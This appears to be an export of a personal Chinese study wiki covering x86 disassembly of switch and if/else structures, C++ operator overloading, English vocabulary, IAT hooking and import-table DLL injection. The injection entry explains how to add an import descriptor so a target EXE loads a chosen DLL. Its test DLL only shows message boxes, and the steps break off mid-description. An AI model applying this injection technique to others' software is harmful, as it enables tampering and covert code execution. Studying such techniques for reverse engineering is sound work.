假设输入给switch的参数值为2，编译器减1调整到case地址数组的下标1后。第一次查表，查索引表，(0040d849)[eax]变成了(0040d849)[1]，为索引表中第1项，为01。第二次查表，查地址表，[edx*4+40D831h]变成了[1*4+40D831h]，为表中第1项，即case2语句块的起始地址。 … n -1调整后的数组下标 是否处于case范围内 (0040d849)[eax]的值 索引表表项 edx*4+40D831h的值 地址表表项 表项的含义 程序的执行流程 -1 -2（-1-1=-2） 补码FFFFFFFE，比10大，跳到default - - - - n=-1，执行default 0 -1（0-1=-1） 补码FFFFFFFF，比10大，跳到default - - - - n=0，执行default 1 0 &lt;=10，继续执行。在case范围内 (0040d849)[0] 00 0*0+40D831h 0040D7C6 case1语句块的起始地址 n=1，执行case1 2 1 &lt;=10，继续执行。在case范围内 (0040d849)[1] 01 0*1+40D831h 0040D7D5 case2语句块的起始地址 n=2，执行case2 3 2 &lt;=10，继续执行。在case范围内 (0040d849)[2] 02 0*2+40D831h 0040D7E4 case3语句块的起始地址 n=3，执行case3 4 3 &lt;=10，继续执行。在case范围内 (0040d849)[3] 05 0*3+40D831h 0040D811 default语句块起始地址 n=4，执行default 5 4 &lt;=10，继续执行。在case范围内 (0040d849)[4] 05 0*4+40D831h 0040D811 default语句块起始地址 n=5，执行default … … … … 05 0*5+40D831h 0040D811 default语句块起始地址 n=…，执行default … … … … 05 0*5+40D831h 0040D811 default语句块起始地址 n=…，执行default 10 9 &lt;=10，继续执行。在case范围内 (0040d849)[9] 03 0*3+40D831h 0040D7F3 case10语句块的起始地址 n=10，执行case10 11 10 &lt;=10，继续执行。在case范围内 (0040d849)[0Ah] 04 0*4h+40D831h 0040D802 case11语句块的起始地址 n=11，执行case11 12 11 比10大，跳到default - - - - n=12，执行default 可以看到，编译器多生成一个小表，小表中的每个表项大小1字节，先查小表得到索引号，然后查地址表得到要去往的地址。用小表1字节的空间，免去了用default语句块首地址/switch语句块的结束地址来连续填充大表间隙（每项占4字节），节省了内存空间。但这种方案执行时要比单一的大表多一次查表的过程，因此效率会有所下降。 当case值个数&gt;小表能表示的256个后，用平衡二叉树。 能否让小表中每个表项用2字节来表示呢？其实可以，但和制作单一的大表相比，其实节省下来的空间也不是很多。 大表+小表占用的总字节数=地址表大小+索引表大小=SUM*4字节+（MAX-MIN）*1字节 地址表大小=SUM*4字节 索引表大小=（MAX-MIN）*1字节 其中， MAX表示最大的case值 MIN表示最小的case值 SUM表示case总数+1（包含default） 小结 结构识别： 获取某一个值进行调整（可能没调整这一步） 跳转指令jcc进行范围检查 如果不在这个范围，则跳走 如果在这个范围，则不跳走，继续执行 跳转指令后有二次查表的过程 第一次查表代码，得到单字节数据；然后分析是否使用了第一次查表中获取的单字节数据作为下标，从而使用相对比例因子寻址方式进行第二次查表；最后检查基址指向的是否是地址表。 1234567891011121314;调整mov reg,mem ;取出switch变量sub reg,1 ;调整对齐到索引表下标0，有可能没有这一步mov mem,reg;下标检查... ;影响标记位的指令jxx xxxx ;超出范围则跳转到switch结尾或default;查表mov reg,[mem] ;取出switch变量xor eax,eax ;eax不是必须使用的，但之后的数组查询用到的寄存器一定是此处使用到的寄存器mov al,byte ptr (xxxx)[reg] ;查索引表，得到地址表的下标jmp dword ptr [eax*4+xxxx] ;查地址表，得到对应case块的首地址 索引表 起始地址：从某个基址开始+偏移，取byte类型数据 case地址表 起始地址：相对比例因子寻址方式中的基址 default语句首地址/switch结束地址 由范围检查jcc的地址确定 索引表中重复的项 索引表中重复的项是switch的结束地址/default语句块的首地址的下标； 独立的项，则不是。 在多个case共用一个语句块时，索引表中也会出现相同标号。如： 1234case 1:case 2:\txxxx;\tbreak; 由于case1中没有任何代码，当执行到它时，就会顺序向下，直到下一个case语句不为空为止。 case语句块 case的判定值和对应语句块的地址 结合索引表和地址表进行分析。索引表中的下标是调整后的下标，所以将索引表中的下标+反向调整（调整数组下标时相反的操作）就能得到case的标号值。通过索引表中的下标在地址表中找就可以找到对应case语句块的起始地址。 例： 索引表中第0项内容为00，在表中是一个独立的数据，说明不是switch的结束地址/default语句块的首地址下标，是case语句块下标。00对到地址表第0项，地址表内容是0040D7C6，表示case1语句块的起始地址。将索引表内容反向调整，就能得到case判定值：（0+1=1）1。 索引表中第3项内容为05，在表中重复出现，说明是switch的结束地址/default语句块的首地址下标。05对到地址表第5项，地址表内容是0040D811，表示switch的结束地址/default语句块的首地址。 索引表项数 索引表内容 索引表内容重复出现or独立出现 对应的地址表内容 地址表内容含义 反向调整得到case标号值 第0项 00 独立出现，说明是case语句块下标，而不是switch的结束地址/default语句块的首地址下标 0040D7C6 case1语句块的起始地址 0+1=1 第3项 05 重复出现，为switch的结束地址/default语句块的首地址下标 0040D811 default语句块首地址 05+1=6 结束地址 两个case起始地址之间 二叉树 实际上，比较少见 总结 case分支数≤3，采用模拟if…else if结构实现相同功能。 case分支数&gt;3，且case判定值存在明显线性关系时： 间隙≤6，大表 间隙&gt;6 且case最大最小差值&lt;255时，大表+小表 case最大最小差值&gt;255时，平衡二叉树 毫不连续的值，平衡二叉树（待查证）"},{"title":"运算符重载","path":"/wiki/C++/运算符重载.html","content":"前言 在之前的学习中，我们知道可以用运算符对基本类型进行操作，以大于号为例 12345int a = 1;int b = 2;int r1 = a &gt; b; // 不成立，r1=0int r2 = a &lt; b; // 成立，r2=1 如果我们想对自定义的数据类型结构体/类进行比较操作。怎么比较？直接写对象1&gt;对象2的代码，是编译不过去的。我们需要自己定义这两个对象怎么个大小法，假设这个类有两个变量，一个x，一个y，我们认为当这个对象的x和y都大于另一个对象的x和y时，认为这个对象大，那么可以写出以下的代码 123456789101112131415161718192021222324#include &lt;stdio.h&gt;class Number&#123;private: int x; int y;public: Number(int x, int y) : x(x), y(y) &#123;&#125; bool Max(const Number &amp;n) &#123; return this-&gt;x &gt; n.x &amp;&amp; this-&gt;y &gt; n.y; // 两个都大，就算这个对象大 &#125;&#125;;void main()&#123; Number n1(3, 4), n2(1, 2); bool r = n1.Max(n2); //将要比较的对象n2传进去比较 printf(&quot;%d &quot;, r); return;&#125; C++引入bool类型，占1字节，其实是char类型的宏定义 想将n1与n2对象进行比较，需要将n2对象作为n1成员函数Max的参数传入。 1int r = n1.Max(n2); //将要比较的对象n2传进去比较 这样使用起来不方便，能否做到像基本类型那样的形式进行比较？ 123int r1 = a &gt; b; // 基本类型比较int r2 = n1 &gt; n2; //对象比较 C++提供了这样的方法：重载运算符。 运算符重载 语法 成员函数形式 1234class ClassName &#123;public: ReturnType operatorX(ArgumentType arg);&#125;; operatorX 是运算符函数，X 是要重载的运算符，例如 +、-、* 等。 非成员函数形式 1ReturnType operatorX(const ClassName &amp;obj1, ArgumentType arg); 例 将前言的例子改成运算符重载的形式 123456789101112131415161718192021222324#include &lt;stdio.h&gt;class Number&#123;private: int x; int y;public: Number(int x, int y) : x(x), y(y) &#123;&#125; bool operator&gt;(const Number &amp;n) //和普通成员函数一样，编译时也会传this指针 &#123; return this-&gt;x &gt; n.x &amp;&amp; this-&gt;y &gt; n.y; &#125;&#125;;void main()&#123; Number n1(3, 4), n2(1, 2); bool r = n1 &gt; n2; // 像基本类型那样进行使用了 printf(&quot;%d &quot;, r); return;&#125; 使用时就可以像基本类型那样进行使用了，很方便 函数返回类型，参数，函数体怎么写，具体看练习题1 Number类重载1234567891011Number&amp; operator++();Number&amp; operator--();Number operator+(Number&amp; n);Number operator-(Number&amp; n);Number operator*(Number&amp; n);Number operator/(Number&amp; n);bool operator&lt;(Number&amp; n);bool operator==(Number&amp; n);bool operator&gt;(Number&amp; n) &#123; return this-&gt;x &gt; n.x &amp;&amp; this-&gt;y &gt; n.y;&#125; 如何确定返回类型 比如++运算符，正常情况下基本类型比如int类型++完后仍是int类型，所以上边Number类重载++运算符后类型仍要是Number类型，因为要实际修改，而不是改的副本，所以这里的函数返回类型是Number&amp; 123456Number&amp; operator++()&#123; x++; y++; return *this; //返回当前对象&#125; 而比较运算符，返回类型是bool类型，真或假。 当运算符重载涉及到修改对象本身时（如 ++ 或 --），通常返回引用是合适的。 当运算符创建一个新的对象时（如 +、-、*、/），则返回值类型应该是对象本身。这样做既避免了不必要的对象复制，又保持了运算符的直观含义。 对于比较运算符，由于比较的结果是布尔值，因此返回 bool 是合适的。 未来可能经常用到需要重载的运算符：&gt;，&lt;，=，== 本质 运算符重载的本质就是给运算符对应一个具体的函数。当编译器执行到 bool r = n1 &gt; n2;这行代码，背后其实也是调用成员函数。可以看到前言中的例子，和，重载运算符后&gt;的反汇编是一样的。 成员函数的方式，没重载重载>运算符 小结 运算符重载就是函数替换，让开发者写代码时更方便 需要自定义规则。比如自定义两个对象比大小，需要重载&gt;运算符 练习 写一份代码，定义一个类，使用两种方式对类进行+、-、*、/、&gt;、&lt;、&gt;=、&lt;=，++，--这些运算符的重载 方式一：成员函数 方式二：友元函数 参考答案+、-、*、/、&gt;、&lt;、&gt;=、&lt;=运算符的重载 方式：成员函数方式：友元函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // 重载运算符作为成员函数 MyNumber operator+(const MyNumber&amp; other) &#123; return MyNumber(value + other.value); &#125; MyNumber operator-(const MyNumber&amp; other) &#123; return MyNumber(value - other.value); &#125; MyNumber operator*(const MyNumber&amp; other) &#123; return MyNumber(value * other.value); &#125; MyNumber operator/(const MyNumber&amp; other) &#123; if (other.value == 0) &#123; std::cerr &lt;&lt; &quot;Division by zero error!&quot; &lt;&lt; std::endl; return MyNumber(0); &#125; return MyNumber(value / other.value); &#125; bool operator&gt;(const MyNumber&amp; other) &#123; return value &gt; other.value; &#125; bool operator&lt;(const MyNumber&amp; other) &#123; return value &lt; other.value; &#125; bool operator&gt;=(const MyNumber&amp; other) &#123; return value &gt;= other.value; &#125; bool operator&lt;=(const MyNumber&amp; other) &#123; return value &lt;= other.value; &#125;&#125;;12345678910111213141516171819202122232425#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // 重载运算符作为友元函数 friend MyNumber operator+(const MyNumber&amp; a, const MyNumber&amp; b); friend MyNumber operator-(const MyNumber&amp; a, const MyNumber&amp; b); friend MyNumber operator*(const MyNumber&amp; a, const MyNumber&amp; b); friend MyNumber operator/(const MyNumber&amp; a, const MyNumber&amp; b); friend bool operator&gt;(const MyNumber&amp; a, const MyNumber&amp; b); friend bool operator&lt;(const MyNumber&amp; a, const MyNumber&amp; b); friend bool operator&gt;=(const MyNumber&amp; a, const MyNumber&amp; b); friend bool operator&lt;=(const MyNumber&amp; a, const MyNumber&amp; b);&#125;;MyNumber operator+(const MyNumber&amp; a, const MyNumber&amp; b) &#123; return MyNumber(a.value + b.value);&#125;// 同样方式实现其他重载的运算符...对于++和–运算符的重载 方式：成员函数方式：友元函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // 前缀 ++ MyNumber&amp; operator++() &#123; ++value; return *this; &#125; // 后缀 ++ MyNumber operator++(int) &#123; MyNumber temp = *this; ++(*this); return temp; &#125; // 前缀 -- MyNumber&amp; operator--() &#123; --value; return *this; &#125; // 后缀 -- MyNumber operator--(int) &#123; MyNumber temp = *this; --(*this); return temp; &#125; // 其他运算符重载...&#125;;int main() &#123; MyNumber num(5); ++num; // 使用前缀 ++ num++; // 使用后缀 ++ --num; // 使用前缀 -- num--; // 使用后缀 -- std::cout &lt;&lt; &quot;Current Value: &quot; &lt;&lt; num.value &lt;&lt; std::endl; return 0;&#125;对于 ++ 和 -- 这样的一元运算符，通常不需要使用友元函数，因为它们仅作用于单个对象。然而，如果确实需要，可以这样实现：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // 声明友元函数 friend MyNumber&amp; operator++(MyNumber&amp; num); friend MyNumber operator++(MyNumber&amp; num, int); friend MyNumber&amp; operator--(MyNumber&amp; num); friend MyNumber operator--(MyNumber&amp; num, int); // 其他运算符重载...&#125;;// 实现友元函数MyNumber&amp; operator++(MyNumber&amp; num) &#123; ++num.value; return num;&#125;MyNumber operator++(MyNumber&amp; num, int) &#123; MyNumber temp = num; ++num.value; return temp;&#125;MyNumber&amp; operator--(MyNumber&amp; num) &#123; --num.value; return num;&#125;MyNumber operator--(MyNumber&amp; num, int) &#123; MyNumber temp = num; --num.value; return temp;&#125;int main() &#123; MyNumber num(5); ++num; // 使用前缀 ++ num++; // 使用后缀 ++ --num; // 使用前缀 -- num--; // 使用后缀 -- std::cout &lt;&lt; &quot;Current Value: &quot; &lt;&lt; num.value &lt;&lt; std::endl; return 0;&#125; 如何确定重载运算符的函数返回类型运算符计算结果是创建一个新的对象，返回值则是创建的对象本身。这样做既避免了不必要的对象复制，又保持了运算符的直观含义。+、-、*、/，以加法为例，都是结果=操作数1 + 操作数2，两操作数计算后不会变，两数相加的结果是存到一个临时对象中，需要把这个创建的对象返回出去，所以+的运算符重载是：1234567891011//成员函数形式MyNumber operator+(const MyNumber&amp; other) &#123; return MyNumber(value + other.value);&#125; //友元函数形式MyNumber operator+(const MyNumber&amp; a, const MyNumber&amp; b) &#123; return MyNumber(a.value + b.value);&#125;涉及比较的，比较结果是bool布尔值，要么真要么假，返回bool类型最合适，且两个比较的数没有发生变化1234567891011//成员函数形式bool operator&gt;(const MyNumber&amp; other) &#123; return value &gt; other.value;&#125; //友元函数形式bool operator&gt;(const MyNumber&amp; a, const MyNumber&amp; b)&#123; return a.value &gt; b.value;&#125;运算结果会修改到对象本身，通常返回引用是合适的（如 ++ 或 --）但这里还要注意前缀和后缀的工作机制区别 什么情况下，运算符重载一定要用到友元函数？ 参考答案需要在类外部访问类的私有或受保护的成员时，需要使用友元函数。一个典型的例子是重载输入输出运算符（&lt;&lt; 和 &gt;&gt;），因为标准输入输出流（例如 std::ostream 和 std::istream）不是类的成员。更宽泛的情况：别人已经写好的运算符，我要拿来重载，只能是友元的形式。此外，如果需要让运算符的行为对于左右操作数是对称的（例如，a + b 和 b + a 应该有相同的行为），那么使用友元函数通常更为合适。这句话的意思是：在某些情况下，我们希望运算符对其两边的操作数具有相同的处理方式，特别是当这些操作数可能属于不同的类型时。使用友元函数可以更容易地实现这种对称性，因为友元函数不是类的成员函数，它们可以对两个操作数进行相等的处理。以加法运算符为例，假设我们有一个 MyNumber 类和一个整数类型，我们希望能够不仅实现 MyNumber + int，还要实现 int + MyNumber，且这两个操作有相同的行为。如果我们只在 MyNumber 类中实现加法运算符，我们只能重载 MyNumber + int，而不能直接重载 int + MyNumber。通过使用友元函数，我们可以同时实现这两种情况。12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;class MyNumber &#123;public: int value; MyNumber(int v) : value(v) &#123;&#125; // 使用友元函数来重载加法运算符 friend MyNumber operator+(const MyNumber&amp; a, const MyNumber&amp; b) &#123; return MyNumber(a.value + b.value); &#125; // 重载 MyNumber + int friend MyNumber operator+(const MyNumber&amp; a, int b) &#123; return MyNumber(a.value + b); &#125; // 重载 int + MyNumber friend MyNumber operator+(int a, const MyNumber&amp; b) &#123; return MyNumber(a + b.value); &#125;&#125;;int main() &#123; MyNumber num1(5); MyNumber sum1 = num1 + 3; // 调用 operator+(MyNumber, int) MyNumber sum2 = 3 + num1; // 调用 operator+(int, MyNumber) std::cout &lt;&lt; &quot;sum1: &quot; &lt;&lt; sum1.value &lt;&lt; std::endl; std::cout &lt;&lt; &quot;sum2: &quot; &lt;&lt; sum2.value &lt;&lt; std::endl; return 0;&#125;在这个例子中，我们分别重载了 MyNumber + int 和 int + MyNumber。这两个运算符虽然操作数的顺序不同，但是它们执行相同的操作（即将一个 MyNumber 对象和一个整数相加）。使用友元函数可以让我们更方便地实现这种对称性。"},{"title":"分支语句","path":"/wiki/C++_disassembly/分支语句_C++_disassembly.html","content":"if语句 if语句根据括号中表达式语句的值决定是否执行语句块： 如果表达式为真值（非0），则进入if语句块执行； 如果表达式为假值（为0），则跳过if语句块，继续运行程序的其他语句。 对应到生成的汇编指令是： 如果表达式为真值（非0），则不跳转，顺序执行 如果表达式为假值（为0），则跳过if语句块 C语言中if语句的规定，是满足if判定的表达式就执行if语句块；而在汇编语言中，jcc指令是满足某条件则跳转，跳过一些代码块。所以，在转换成汇编代码后，就是if表达式结果为假，则跳过if语句块。 因此，if语句转换后的汇编代码是取源码中相反的条件跳转指令。 例如下面这个例子，源码是&gt;0成立则执行if语句块。汇编生成的jcc指令是jle指令，&lt;=则跳过if语句块。 123456789#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; if (argc &gt; 0) &#123; printf(&quot;%d &quot;, argc); &#125; return 0;&#125; x86_vc（Debug版）x86_vs（Debug版）1234567891011121314151617181920212200401010 push ebp00401011 mov ebp,esp00401013 sub esp,40h00401016 push ebx00401017 push esi00401018 push edi00401019 lea edi,[ebp-40h]0040101C mov ecx,10h00401021 mov eax,0CCCCCCCCh00401026 rep stos dword ptr [edi]00401028 cmp dword ptr [ebp+8],00040102C jle main+2Fh (0040103f) ;如果argc&lt;=0，则跳转到if结束代码块&#123;0040102E mov eax,dword ptr [ebp+8]00401031 push eax00401032 push offset string &quot;%d &quot; (0042201c)00401037 call printf (00401070)0040103C add esp,8 ;if语句块代码&#125;0040103F xor eax,eax ;if结束代码块123456789101112131415161700401000 push ebp00401001 mov ebp, esp00401003 cmp dword ptr [ebp+8],000401007 jle short loc_40101A ;如果argc&lt;=0，则跳转到if结束代码块&#123;00401009 mov eax,[ebp+8]0040100C push eax004010OD push offset unk_41216000401012 call sub_40106000401017 add esp,8 ;if语句块代码&#125;0040101A loc_40101A: ;if结束代码块0040101A xor eax, eax0040101C pop ebp0040101D retn 从汇编正向角度解释：为什么生成的jcc指令与C语言中表达式相反？用编写正向汇编代码的思路来说明：1234567891011 cmp dword ptr [ebp+8],0 jg L1+ jmp L2L1: mov eax,[ebp+8] push eax push offset string &quot;%d &quot; call printf add esp,8L2: xor eax,eax生成的jcc指令与源码一样要多一条jmp指令。而反过来生成，就可以少一条jmp指令。那把else语句块提前，把if语句块放后面。这样汇编语言和C语言的判定条件不就一致了吗？在C语言中，低行数的代码在编译后的二进制文件中处在低地址的位置，高行数的代码在高地址。有时会通过标号相减得到代码段的长度，所以C语言的编译器不能随意改变代码行在内存中的顺序。 总结 如遇到以下指令序列，可怀疑是一个if语句组成的单分支结构。根据比较信息和条件跳转指令，将反汇编中的跳转条件相反，即可恢复分支结构原型。 123456789;先是执行会影响标志位的相关指令 ;随后跟着各种条件跳转指令 jxx xxxx &#123; ... //if语句块起始 ... ... //语句块结束部分没有jmp &#125; ... //jxx向下跳转的地址就是if语句块结束的地方 注意： 在反汇编中，表达式短路和if语句两种分支结构的实现过程一样 循环结构中也会出现类似代码，分析时要结合上下文 if…else…语句 if…else…语句根据括号中表达式语句的值决定执行if语句块还是else语句块： 如果表达式为真值（非0），则执行if语句块， 不执行else语句块 如果表达式为假值（为0），则跳过if语句块，执行else语句块 所以，if…else…语句，程序在流程选择时，必会经过两个分支的其中一个。 对应到生成的汇编指令是： 如果表达式为真值（非0），则不跳转，顺序执行执行if语句块，随后接jmp指令跳过else语句块 如果表达式为假值（为0），jcc指令则跳过if语句块，跳到else语句块顺序执行 例 12345678910111213#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; if (argc == 0) &#123; printf(&quot;argc == 0&quot;); &#125; else &#123; printf(&quot;argc != 0&quot;); &#125; return 0;&#125; x86_vs（Debug版）123456789101112131415161718192021222300401001 mov ebp,esp00401003 cmp dword ptr [ebp+8],000401007 jnz short loc_401018 ;如果argc!=0,则跳转到else语句块代码&#123;00401009 push offset aArgc00040100E call sub_40107000401013 add esp,4 ;if语句块代码&#125;00401016 jmp short loc_401025 ;跳转到if_else结束代码块&#123;00401018 loc_401018:00401018 push offset aArgc0_00040101D call sub_40107000401022 add esp,4 ;else语句块代码&#125;00401025 loc_401025: ;if_else结束代码块00401025 xor eax, eax00401027 pop ebp00401028 retn 00401003-00401013地址的汇编指令与前边讲的if语句指令序列一样，也是取源码相反的条件跳转指令。 00401016处的jmp指令用于跳过else语句块。00401007跳向的是else语句块。 总结 jcc和jmp两处的跳转作为“指路明灯”。 当遇到如下指令序列，先观察其中的两个跳转指令（jcc和jmp）。如果jcc跳到的地址ELSE_BEGIN前有JMP指令，则视为if…else…双分支结构。并且根据这两个跳转指令得到if和else语句块的边界。 if语句块： jcc和jmp之间 由cmp+jcc还原出if的比较信息 else语句块： 起始部分 jcc-&gt;ELSE_BEGIN，jcc跳向的是else语句块起始部分 或 jmp之后 结尾部分 jmp-&gt;ELSE_END，jmp跳向的地址是else语句块结束的地址。 123456789101112131415161718 ;先执行影响标志位的相关指令 jxx ELSE_BEGIN ;跳向else语句块的起始地址&#123; IF_BEGIN: ...... ;if语句块 ...... IF_END:&#125; jmp ELSE_END ;跳向else语句块的结束地址&#123; ELSE_BEGIN: ...... ;else语句块 ...... ELSE_END:&#125; ...... 注意： 表达式短路和if…else…语句分支结构的指令序列类似 多分支流程 if…else if…部分和前面讲的if…else…语句一样，只不过jcc跳向的地址是下一个else…if语句块或else语句块。 若多个jcc指令跳向的地址前都为jmp指令，且这些jmp指令跳向的地址一样，则视为一个多分支结构。 例 123456789101112131415161718#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; if (argc &gt; 0) &#123; printf(&quot;argc &gt; 0&quot;); &#125; else if (argc == 0) &#123; printf(&quot;argc == 0&quot;); &#125; else &#123; printf(&quot;argc &lt;= 0&quot;); &#125; return 0;&#125; x86_vs（Debug版）12345678910111213141516171819202122232425262728293031323300401000 push ebp00401001 mov ebp, esp00401003 cmp dword ptr [ebp+8],000401007 jle short loc_401018 ;如果argc&lt;=0，则跳转到else_if语句块代码&#123;00401009 push offset aArgc00040100E call sub_40108000401013 add esp,4 ;if语句块代码&#125;00401016 jmp short loc_40103A ;跳转到多分支结构的末尾地址&#123;00401018 cmp dword ptr [ebp+8],00040101C jnz short loc_40102D ;如果argc!=0，则跳转到else语句块代码0040101E push offset aArgc0_000401023 call sub_4010800401028 add esp,4 ;else_if语句块代码&#125;0040102B jmp short loc_40103A ;跳转到多分支结构的末尾地址&#123; //观察到这里无跳转0040102D push offset aArgc0_100401032 call sub_40108000401037 add esp,4 ;else语句块代码&#125;0040103A xor eax, eax ;if_else_if结束代码0040103C pop ebp0040103D retn 利用jxx和jmp识别出if和else…if语句块的边界 jxx指出了下一个else…if的起始点，或，else的起始点 jmp指出了整个多分支结构的末尾地址，以及，当前if或else…if语句块的末尾 如果某个语句块中没有判定，则是else语句块 边界识别 特点 比较条件 if语句块 jcc和jmp之间 由比较判断指令+jcc还原出比较信息 else…if语句块 起始部分：上一个语句块jcc跳向的地址结尾部分：jmp之前 由比较判断指令+jcc还原出比较信息 else语句块 起始部分：上一个语句块jcc跳向的地址结尾部分：多个jmp都跳向的地址 语句块中无jcc跳转 12345678910111213141516171819202122232425262728293031 ;执行影响标志位的指令 jxx ELSE_IF_BEGIN ;跳向下一条else if语句块的首地址&#123; IF_BEGIN: ...... ;if语句块 ...... IF_END:&#125; jmp END ;跳转到多分支结构的结尾地址&#123; ELSE_IF_BEGIN: ;else if语句块的起始地址 ;执行影响标志位的指令 jxx ELSE_BEGIN ;跳转到else分支语句块的首地址 ...... ;else if语句块 ...... ELSE_IF_END: &#125; jmp END ;跳转到多分支结构的结尾地址&#123; ELSE_BEGIN: //无跳转，判定为else块 ...... ;else语句块 ...... END: ;else语句块结尾处，也是多分支结构的结尾处&#125; ......"},{"title":"音标","path":"/wiki/English/音标.html","content":"常犯错混淆的： [u]和[u:] proof prove reveal review （后面补上音标） 连读难听出来的： If you**'re** busy next weekend,we can play it by ear. You**'ve** got to get into this hot tub.The water feels amazing. If you**'re** starting to panic,take a deep breath.It’ll help you relax."},{"title":"积累摘抄本","path":"/wiki/English/积累摘抄本.html","content":"单词 precise nostalgic reminisce diss（You’re dissed.） handle（I will ） faucet，例：Why is no water coming out of this faucet? sink，例：Excuse me.There are insects coming out of the sink in my room. 短语 get a hold of long story short 长话短说 play tag捉迷藏 hide and seek捉迷藏 play equipment takes one to know one get in shape，例：It’s a quick and easy way to get in shape. 句子 For aches,this medicine needs to be taken once a day. 疼痛ache，复数+了s Someone less dedicated would have quit months ago. 不那么敬业的人早在几个月前就辞职了"},{"title":"IAT Hook","path":"/wiki/Hook/IAT_Hook.html","content":"参考《加密与解密》 修改IAT表中的函数地址"},{"title":"目录","path":"/wiki/Hook/目录.html","content":"具体的Hook技术有很多，但从大体上分为两类： 改函数地址，Address Hook 改函数内部的代码，Inline Hook 目录 文章名 类型 备注 IAT Hook"},{"title":"小结","path":"/wiki/Modern_C++/小结_Modern_C++.html","content":"参考链接🔗 备注 C0x（C11）新特性点评 对C++ 11新特性的点评"},{"title":"导入表注入","path":"/wiki/Injection/导入表注入.html","content":"导入表注入原理 exe加载时，系统加载器根据它的导入表将需要用到的dll载入到进程空间中。每一张导入表，对应一个需要用到的dll。导入表注入就是新增一张导入表，这个表项描述自己的dll。如此，目标exe运行时，系统加载器便会将我们自己的这个dll也加载到进程空间中。 一些细节问题 需要移动导入表：导入表混在节数据中，现有的导入表后不够空间新增一张导入表，所以要移动导入表。移动的话只移动导入表即可 新增要全套：即使加了一张导入表来描述自己的dll，但如果它的OriFirstThunk和FirstThunk是空的，当这个exe运行时，这个dll也不会被加载到exe中。INT和IAT表至少要有一项有效的导入函数条目，这一导入函数项是为了形成一个完整的导入表，并不需要exe真的用到这个导入函数。 这个导入函数要在dll中实际存在。如果是随便写的，而dll中不存在，运行exe时会报0xC0000007b，如下图 原有导入表导入表注入后 红色部分为自己新增的 Hint那里填零即可，也可以算一下再填 新增一个全套导入表信息需要的空间大小： A：一张导入表，20个字节 B：INT表（一项+结尾），两个8字节 C：IAT表（一项+结尾），两个8字节 D：提示名表，2字节的Hint + 字符串长度 + 1 B，C，D可以另找地方放。 假设原来的IID数组大小为OldIIDSize（这个值就是数据目录表中导入表的Size值，这个值算上了结尾的20字节空结构体），那么找一个空白区放移动后的IID数组，至少要NewIIDSize=OldIIDSize+20字节（新增的导入表）的大小。找空白区可以写一个函数按指定长度在PE文件的空白区中找，或者通过扩大节，新增节来解决。 后面的代码实现直接是新增节来解决 IAT表存放的位置要可写。因为系统加载器加载PE时会进行IAT表替换工作，如果不可写，加载时会报错。 如果目标exe本身存在绑定导入表，需要将数据目录表中关于绑定导入表的信息清零。让它加载时强制重新替换IAT表。 对抗性 这种直接修改PE文件输人表的方法，适用于EXE本身无校验（CRC、数字签名或其他校验算法）的情况。因为输人表的加载过程是递归的，所以假如EXE本身有校验，而它所加载的某个第三方模块无校验，那么修改第三方模块的输人表一样可以达到注人目标进程的目的。但是，如果所有模块都有校验，就不能直接修改文件了，而应该采用进程创建期修改PE输人表的方法。 《加密与解密4th》P455 代码实现 测试的dll Fun.h和Fun.cppdllmain.cppFun.h12345#pragma oncevoid Init();void Destroy();extern &quot;C&quot; _declspec(dllexport) void ExportFunction(); Fun.cpp1234567891011121314151617#include &lt;Windows.h&gt;#include &quot;Fun.h&quot;void Init()&#123;\tMessageBox(0, TEXT(&quot;Init&quot;), TEXT(&quot;Init&quot;), MB_OK);&#125;void Destroy()&#123;\tMessageBox(0, TEXT(&quot;Destroy&quot;), TEXT(&quot;Destroy&quot;), MB_OK);&#125;void ExportFunction()&#123;\tMessageBox(0, TEXT(&quot;ExportFunction&quot;), TEXT(&quot;ExportFunction&quot;), MB_OK);&#125;DLL_PROCESS_ATTACH： dll被加载时会被调用 主动用LoadLibrary加载这个dll时会被调用 1HINSTANCE hModule = LoadLibrary(&quot;InjectDll.dll&quot;); DLL_PROCESS_DETACH： dll被销毁时会被调用 代码显式卸载时会被调用 1FreeLibrary(hModule); dllmain.cpp123456789101112131415161718192021222324#include &lt;Windows.h&gt;#include &quot;Fun.h&quot;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: Init(); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: Destroy(); break; &#125; return TRUE;&#125; 测试方法 用DependenciesGui能看到导出函数被导出 新建另一个工程，看能否正常显式加载，调用导出函数，卸载这个dll 用于测试刚才的dll1234567891011121314151617181920212223242526272829303132333435#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\ttypedef void (*lpTest)();\tlpTest MyFunction;\t//加载DLL\t//HINSTANCE hModule = LoadLibrary(&quot;E:\\\\temp\\\\IATInjection.dll&quot;);\tHINSTANCE hModule = LoadLibrary(&quot;D:\\\\005_Codefield\\\\VS2019\\\\IATHook_Dll\\\\Debug\\\\IATInjection_Dll.dll&quot;);\tif (hModule == NULL)\t&#123; printf(&quot;[!] Failed to load IATInjection.dll &quot;); return 0;\t&#125;\t//获取函数地址\tMyFunction = (lpTest)GetProcAddress(hModule, &quot;ExportFunction&quot;);\tif (MyFunction == NULL)\t&#123; printf(&quot;[!] Failed to get the address of ExportFunction &quot;); FreeLibrary(hModule); return 0;\t&#125;\t//调用函数\tMyFunction();\t//释放DLL\tFreeLibrary(hModule);\treturn 0;&#125; 能看到三个弹窗，说明这个dll是ok的 程序流程设计 获得目标exe文件的m_lpFileBuffer文件内存映像（未拉伸），获取相关PE指针 对m_lpFileBuffer新增大小为0x1000的节，返回出lpNewBuffer（未拉伸） 在lpNewBuffer上移动导入表到新节 具体做法是： 遍历导入表，统计个数，将导入表拷走，记录新导入表的RVA 